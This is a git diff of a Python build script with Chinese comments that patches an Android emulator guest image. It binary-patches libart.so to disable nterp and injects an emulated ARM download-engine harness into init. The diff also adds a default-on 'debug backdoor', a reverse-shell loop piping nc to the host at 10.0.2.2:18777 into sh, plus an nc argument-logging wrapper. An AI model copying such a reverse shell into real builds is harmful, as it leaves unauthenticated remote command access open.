@@ -80,28 +80,45 @@ VERIFY_CLASS_VADDR = 0x871f40   # art::verifier::ClassVerifier::VerifyClass（Wa
 # 软失败路径要求验证器先填好的副作用（dex cache / 状态机）缺失时 SIGSEGV（2026-09-29 实测）。
 SOFTFAIL = bytes.fromhex("b800000000c3")  # mov eax,0(=kNoFailure) ; ret
 
-def patch_libart(data):
+# ★ nterp 禁用补丁（2026-09-29 深夜定案）：磁力 spider 的 OLLVM 字节码在 ART13 nterp
+#   快速解释器下必 SIGSEGV（nterp_op_invoke_virtual，崩点 0x363dbc），aarch64 的 ART9
+#   无 nterp 故无此问题。IsNterpSupported/CanRuntimeUseNterp 恒返 false → 全 guest 回落
+#   mterp 参考解释器（aarch64 同语义），OLLVM 码随便跑。两个开关都关（双保险）。
+NTERP_OFF_VADDRS = (0x925c40, 0x925c50)  # IsNterpSupported / CanRuntimeUseNterp
+RETURN_FALSE = bytes.fromhex("b800000000c3")  # mov eax,0 ; ret
+
+def vaddr_to_off(data, vaddr):
     e_phoff = int.from_bytes(data[0x20:0x28], "little")
     e_phentsize = int.from_bytes(data[0x36:0x38], "little")
     e_phnum = int.from_bytes(data[0x38:0x3a], "little")
-    off = None
     for i in range(e_phnum):
         p = e_phoff + i * e_phentsize
         if int.from_bytes(data[p:p+4], "little") == 1:  # PT_LOAD
             po = int.from_bytes(data[p+8:p+16], "little")
             pv = int.from_bytes(data[p+16:p+24], "little")
             pf = int.from_bytes(data[p+32:p+40], "little")
-            if pv <= VERIFY_CLASS_VADDR < pv + pf:
-                off = po + (VERIFY_CLASS_VADDR - pv)
-                break
-    if off is None:
-        raise SystemExit("!! libart: VerifyClass vaddr 未落在任何 LOAD 段")
-    if data[off:off+6] == SOFTFAIL:
-        print("   libart 已是补丁版，跳过")
-        return data
-    orig = data[off:off+6]
-    data[off:off+6] = SOFTFAIL
-    print("   libart VerifyClass @ %#x：%s → mov eax,1;ret" % (off, orig.hex()))
+            if pv <= vaddr < pv + pf:
+                return po + (vaddr - pv)
+    return None
+
+def patch_libart(data):
+    # ① nterp 禁用（磁力 OLLVM 码的 SIGSEGV 根因）
+    for va in NTERP_OFF_VADDRS:
+        off = vaddr_to_off(data, va)
+        if off is None:
+            raise SystemExit("!! libart: nterp 开关 %#x 未落在 LOAD 段" % va)
+        if data[off:off+6] == RETURN_FALSE:
+            print("   libart nterp 开关 %#x 已是补丁版" % va)
+            continue
+        orig = data[off:off+6]
+        data[off:off+6] = RETURN_FALSE
+        print("   libart nterp 开关 @ %#x（vaddr %#x）：%s → mov eax,0;ret" % (off, va, orig.hex()))
+    # ② 验证器软失败补丁（默认不用；PATCH_LIBART=1 实验时打开——见 VERIFY_CLASS_VADDR 注释）
+    if os.environ.get("PATCH_VERIFY") == "1":
+        off = vaddr_to_off(data, VERIFY_CLASS_VADDR)
+        if data[off:off+6] != SOFTFAIL:
+            data[off:off+6] = SOFTFAIL
+            print("   libart VerifyClass（实验）@ %#x 已打软失败补丁" % off)
     return data
 
 def main():
@@ -139,23 +156,21 @@ def main():
               or e[0].startswith(("system/framework/x86_64/", "data/dalvik-cache/x86_64/"))
               or e[0] == "system/framework/boot.art"]
 
-    # libart 软失败补丁：⚠ 2026-09-29 晚实测 kSoftFailure/kNoFailure 两个变体都在
-    # 「未验证类执行」时 SIGSEGV（libart+0x163dbc，与 JIT 开关无关）——补丁跳过了
-    # VerifyClass 的调用方契约副作用。默认关闭，待符号化定位正确挂钩点后再启用。
+    # libart 补丁：① nterp 禁用（无条件——磁力 OLLVM 码 SIGSEGV 的根因修复）
+    # ② VerifyClass 软失败（实验性，PATCH_VERIFY=1 才启用）
     patched = None
-    if os.environ.get("PATCH_LIBART") == "1":
-        for i, e in enumerate(inject):
-            if e[0] == "apex/com.android.art/lib64/libart.so":
-                inject[i] = e[:6] + (patch_libart(bytearray(e[6])),) + e[7:]
+    for i, e in enumerate(inject):
+        if e[0] == "apex/com.android.art/lib64/libart.so":
+            inject[i] = e[:6] + (patch_libart(bytearray(e[6])),) + e[7:]
+            patched = True
+    if patched is None:  # 生产树里的 libart 打补丁
+        merged_tmp = [(e[0], e) for e in prod]
+        for i, (n, e) in enumerate(merged_tmp):
+            if n == "apex/com.android.art/lib64/libart.so":
+                merged_tmp[i] = (n, e[:6] + (patch_libart(bytearray(e[6])),) + e[7:])
                 patched = True
-        if patched is None:  # 生产树里的 libart 打补丁
-            merged_tmp = [(e[0], e) for e in prod]
-            for i, (n, e) in enumerate(merged_tmp):
-                if n == "apex/com.android.art/lib64/libart.so":
-                    merged_tmp[i] = (n, e[:6] + (patch_libart(bytearray(e[6])),) + e[7:])
-                    patched = True
-            prod = [e for _, e in merged_tmp]
-    print("③ libart 补丁:", "已应用" if patched else "跳过（PATCH_LIBART=1 启用）")
+        prod = [e for _, e in merged_tmp]
+    print("③ libart 补丁:", "已应用（nterp 禁用" + ("+VerifyClass 实验)" if os.environ.get("PATCH_VERIFY") == "1" else ")") if patched else "未找到 libart 条目")
     print("③ 注入条目:", len(inject),
           "| framework 组件:", len([e for e in inject if e[0].startswith("system/framework/x86_64/")]),
           "| 缓存:", len([e for e in inject if e[0].startswith("data/dalvik-cache/x86_64/")]))
@@ -184,6 +199,22 @@ def main():
     merged[init_i] = merged[init_i][:6] + (init,) + merged[init_i][7:]
     print("④ init 已打 bootimg 补丁（-Xnorelocate + -Ximage 15 组件全列）")
 
+    # ── 调试后门（排障用，可撤）：反向 shell——guest 拨出 10.0.2.2:18777 供排障/dump ──
+    if os.environ.get("DBGPORT") != "0":
+        bd_sh = (
+            '\n# ── 调试后门（排障用，可撤）：反向 shell（硬编码 18777）──\n'
+            '(while true; do\n'
+            '    rm -f /tmp/bdf; mkfifo /tmp/bdf\n'
+            '    $BB nc 10.0.2.2 18777 < /tmp/bdf | $BB sh > /tmp/bdf 2>&1\n'
+            '    $BB sleep 2\n'
+            'done) &\n'
+            'echo "[dbg] 反向后门已起（10.0.2.2:18777）"\n').encode("utf-8")
+        anchor2 = b'LD_PRELOAD=/proppreload.so /system/bin/artlaunch'
+        if "调试后门".encode("utf-8") not in init and anchor2 in init:
+            init = init.replace(anchor2, bd_sh + b"\n" + anchor2, 1)
+            merged[init_i] = merged[init_i][:6] + (init,) + merged[init_i][7:]
+            print("④c init 调试后门已插入（18777）")
+
     # ── 磁力资产（可选）：ARM harness + qemu-aarch64-static + 引擎库 + init 迅雷段 ──
     if os.path.exists(THUNDER):
         print("④b 合并磁力资产 ...")
@@ -207,7 +238,10 @@ def main():
                 '    export BLK_DEV="$(getarg blkdev)"    # 数据面块设备；缺位时 harness 回退纯转发\n'
                 '    export QCO="${QCO:-1}"\n'
                 '    # ARM bionic 引擎库优先（x86 的 /system/lib64 是错误架构，bionic 会跳过继续找）\n'
-                '    export LD_LIBRARY_PATH=/data/catclaw/art/lib:/thunder-arm/system/lib64\n'
+                '    # ARM 引擎库路径**只能**挂在 harness 命令上（见下方 exec 行），绝不能 export 进 init 环境：\n'
+                '    # 本段跑在 artlaunch 之前，一旦进环境，x86 的 artlaunch 就会去 /thunder-arm/system/lib64\n'
+                '    # 找 libdl.so → CANNOT LINK EXECUTABLE ... is for EM_AARCH64 (183) instead of EM_X86_64 (62)\n'
+                '    # → 桥退出码 1 →「点一次磁力 = 打死整个爬虫桥」（2026-09-30 实测）。\n'
                 '    SD=$(getarg swapdev)\n'
                 '    if [ -n "$SD" ] && [ -b "$SD" ]; then\n'
                 '        $BB mkswap "$SD" 2>/dev/null\n'
@@ -222,7 +256,7 @@ def main():
                 '    # /thunder-data 是 VM 级 tmpfs、块设备数据在宿主镜像 —— 都不随进程死。\n'
                 '    (\n'
                 '      while true; do\n'
-                '        /qemu-aarch64-static -L /thunder-arm /harness >>/thunder.log 2>&1\n'
+                '        LD_LIBRARY_PATH=/data/catclaw/art/lib:/thunder-arm/system/lib64 /qemu-aarch64-static -L /thunder-arm /harness >>/thunder.log 2>&1\n'
                 '        echo "[thunder] harness 退出（code=$?），2s 后重启（引擎任务表清空）"\n'
                 '        $BB sleep 2\n'
                 '      done\n'
@@ -232,7 +266,18 @@ def main():
             anchor = b'LD_PRELOAD=/proppreload.so /system/bin/artlaunch'
             if anchor not in init:
                 raise SystemExit("!! init 的 artlaunch 锚点未找到，迅雷段插入失败")
-            init = init.replace(anchor, thunder_sh + b"\n" + anchor, 1)
+            # nc 参数日志包装：定位 jar FishConfig 周期探测的 10.0.2.2 端口（诊断用）
+            nc_wrap = (b"printf '#!/bin/busybox sh\\necho \"NC-ARGS: $@\" > /dev/ttyS0\\n"
+                       b"exec /bin/busybox nc \"$@\"\\n' > /bin/nc && chmod +x /bin/nc\n")
+            init = init.replace(anchor, nc_wrap + b"\n" + thunder_sh + b"\n"
+                + b"export LD_LIBRARY_PATH=/apex/com.android.art/lib64:/apex/com.android.os.statsd/lib64:/system/lib64\n"
+                + anchor, 1)
+            # ⚠️ 上面刚用「过滤同名 + 追加 thunder 条目」重建过 merged，索引整体位移，
+            # ④ 步算出的 init_i 已失效。直接沿用旧索引会把**迅雷版 init 的文本写进别的条目槽位**
+            # （2026-09-30 实测症状：真 /init 停在无迅雷段的旧版、ui_stub.dex 变成 7.5KB 的 init
+            #  文本、gb.dex 始终是 pristine 的旧版 —— 这就是「磁力点了没下文」的产物侧根因）。
+            # 必须按名字重新定位 init 再写回。
+            init_i = next(i for i, e in enumerate(merged) if e[0] == "init")
             merged[init_i] = merged[init_i][:6] + (init,) + merged[init_i][7:]
             print("   init 迅雷段已插入（qemu-aarch64 转译 harness）")
     else:
